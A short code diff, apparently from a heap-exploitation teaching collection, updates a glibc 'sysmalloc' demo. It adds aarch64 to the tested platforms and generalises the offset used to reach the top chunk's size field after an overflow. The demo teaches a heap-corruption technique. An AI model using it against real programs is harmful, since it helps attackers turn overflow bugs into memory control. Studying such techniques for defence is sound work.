@@ -27,11 +27,11 @@
 
 /**
  * Tested on:
- *  + GLIBC 2.39 (x86_64 & x86)
- *  + GLIBC 2.34 (x86_64 & x86)
- *  + GLIBC 2.31 (x86_64 & x86)
- *  + GLIBC 2.27 (x86_64 & x86)
- *  + GLIBC 2.23 (x86_64)
+ *  + GLIBC 2.39 (x86_64, x86 & aarch64)
+ *  + GLIBC 2.34 (x86_64, x86 & aarch64)
+ *  + GLIBC 2.31 (x86_64, x86 & aarch64)
+ *  + GLIBC 2.27 (x86_64, x86 & aarch64)
+ *  + GLIBC 2.23 (x86_64 & aarch64)
  *
  * sysmalloc allows us to free() the top chunk of heap to create nearly arbitrary bins,
  * which can be used to corrupt heap without needing to call free() directly.
@@ -77,11 +77,7 @@ int main() {
   new = malloc(allocated_size);
 
   // use BOF or OOB to corrupt to the top_chunk
-#if __amd64__
-  top_size_ptr = &new[(allocated_size/SIZE_SZ)+1];
-#else
-  top_size_ptr = &new[(allocated_size / SIZE_SZ) + 3];
-#endif
+  top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];
 
   top_size = *top_size_ptr;
 
